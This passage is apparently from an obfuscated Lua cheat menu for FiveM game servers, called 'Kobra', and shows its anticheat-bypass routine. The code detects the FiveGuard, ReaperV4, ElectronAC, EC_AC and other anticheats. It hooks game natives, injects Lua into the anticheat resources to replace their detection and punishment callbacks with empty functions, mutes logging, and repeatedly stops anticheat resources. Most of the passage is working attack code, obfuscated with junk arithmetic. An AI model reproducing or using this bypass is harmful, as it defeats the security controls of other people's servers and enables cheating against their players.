v1058=0 + 0 ,v751-1  do local v1059=GetResourceMetadata(v750,"client_script",v1058);if (v1059 and string.find(v1059,"obfuscated")) then v115=v750;print("^7[^5Kobra^7]: Detected FiveGuard in Resource: "   .. v750 );return v750;end end break;end if (v749==(1838 -(286 + 1552))) then v750=GetResourceByFindIndex(v748);v751=GetNumResourceMetadata(v750,"client_script");v749=1278 -(1016 + 261) ;end end end return nil;end end end v12.LoadBypass=function(v310) local v311={"216.146.24.88:30120","91.190.154.74:30120"};local v312=GetCurrentServerEndpoint();for v516,v517 in ipairs(v311) do if (v312==v517) then v310:Notify("error","Kobra","Bypass disabled for this server.",3000);return;end end v310:Notify("info","Kobra","Loading Anticheat Bypass...",4320 -(708 + 612) );v116();v117();Wait(2776 -1776 );if (GetResourceState("ReaperV4")=="started") then local v600=0 + 0 ;while true do if (v600==(382 -(113 + 266))) then print("ReaperV4 Bypass Enabled");v310:Notify("info","Kobra","ReaperV4 Bypass Loaded",4170 -(979 + 191) );break;end if (v600==(2 -0)) then MachoHookNative(15349248000000000000 -(339 + 1396) ,function(...) return false,0;end);MachoHookNative(18127728000000000000,function(...) return false,true;end);v600=1 + 2 ;end if (v600==(0 + 0)) then MachoInjectResource2(2,"ReaperV4",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local reaper_newdetection
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "Reaper:NewDetection" then
                        reaper_newdetection = func
                    end
                end
                if type(reaper_newdetection) ~= "function" then
                    return print("error")
                end
                local _, securityclient = debug.getupvalue(reaper_newdetection, 1)
                for name, detection in pairs(securityclient["detections"]) do
                    if detection["detected"] then
                        securityclient["detections"][name]["detected"] = function(...)
                            local args = { ... }
                            print(name, "detected", json.encode(args or {}))
                            return
                        end
                    end
                    if detection["callback"] then
                        securityclient["detections"][name]["callback"] = function(...)
                            local args = { ... }
                            print(name, "callback", json.encode(args or {}))
                            return
                        end
                    end
                end
                for name, detection in pairs(securityclient["active_detections"]) do
                    if detection["detected"] then
                        securityclient["active_detections"][name]["detected"] = function(...) return end
                    end
                    if detection["callback"] then
                        securityclient["active_detections"][name]["callback"] = function(...) return end
                    end
                end
                Debug.setupvalue(reaper_newdetection, 1, securityclient)
                print("ReaperV4 | Client Bypassed")
            end)
        ]]);MachoHookNative(14327026000000000000 -0 ,function(...) return false,false;end);v600=1;end if (v600==(1 + 0)) then MachoHookNative(10181871000000000000 -0 ,function(...) return false,6 -3 ;end);MachoHookNative(12777102000000000000 -  -89903281 ,function(...) return false,true;end);v600=2;end end elseif (v114~=nil) then local v752=0;while true do if ((0 + 0)==v752) then v49("ElectronAC",[[
            print = function() end
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (string.find(msg, "DEBUG") or string.find(msg, "NEWDBG") or string.find(msg, "A11AXXX") or string.find(msg, "function") or string.find(msg, "TriggerServerEvent")) then
                    originalTrace(msg)
                end
            end
        ]]);MachoInjectResource2(6 -4 ,"ElectronAC",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local eAcVerify
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "ElectronAC.verify" then
                        local upname, func = debug.getupvalue(func, 1)
                        eAcVerify = func
                    end
                end
                local EACTable = nil
                local eacUpvalueIndex = nil
                local i = 1
                while true do
                    local name, value = debug.getupvalue(eAcVerify, i)
                    if not name then break end
                    if type(value) == "table" then
                        local hasEACStructure = false
                        for idx, tbl in pairs(value) do
                            if type(tbl) == "string" then
                                if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                    hasEACStructure = true
                                end
                                if hasEACStructure then break end
                            end
                        end
                        if hasEACStructure then
                            EACTable = value
                            eacUpvalueIndex = i
                            break
                        end
                    end
                    i = i + 1
                end
                if not EACTable then
                    print("EAC table not found!")
                    return
                end
                local punish = function(...) return end
                for idx, tbl in pairs(EACTable) do
                    if type(tbl) == "table" then
                        for subIdx, subTbl in pairs(tbl) do
                            if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                                subTbl["punish"] = punish
                            end
                        end
                    end
                end
                Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
                print("ElectronAC | Client Bypassed")
            end)
        ]]);break;end end elseif (v115~=nil) then CreateThread(function() while true do local v1060=0 + 0 ;while true do if (v1060==1) then Wait(2000);break;end if (v1060==(0 + 0)) then MachoResourceStop(v115);print("^7[^5Kobra^7]: Stopped Resource: "   .. v115 );v1060=1 -0 ;end end end end);return;elseif (GetResourceState("EC_AC")=="started") then MachoInjectResourceRaw("EC_AC",[[print = function() end]]);MachoInjectResourceRaw("EC_AC",[[
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (
                    string.find(msg, "DEBUG") or
                    string.find(msg, "NEWDBG") or
                    string.find(msg, "A11AXXX") or
                    string.find(msg, "function") or
                    string.find(msg, "TriggerServerEvent")
                ) then
                    originalTrace(msg)
                end
            end
        ]]);local v1061={"EC_AC"};for v1128=1, #v1061 do local v1129=v1061[v1128];MachoInjectResource(v1129,[[
                print(GetCurrentResourceName())
                for name, func in pairs(_G) do
                    if name == "TriggerEvent" then return end
                    _G[name] = nil
                    print(name, func)
                end
            ]]);Wait(600 + 450 );end CreateThread(function() while true do local v1163=0 + 0 ;while true do if (v1163==(0 -0)) then Wait(0 + 0 );MachoResourceStop("EC_AC");break;end end end end);end if (GetResourceState("WaveShield")=="started") then v12:Notify("error","Kobra","WaveShield Anticheat Found.",3000);elseif (GetResourceState("ReaperV4")=="started") then v12:Notify("error","Kobra","ReaperV4 Anticheat Found.",3640 -(455 + 185) );elseif (GetResourceState("ElectronAC")=="started") then v12:Notify("error","Kobra","ElectronAC Anticheat Found.",3000);elseif (GetResourceState("FiniAC")=="started") then v12:Notify("error","Kobra","FiniAC Anticheat Found.",3000);end end;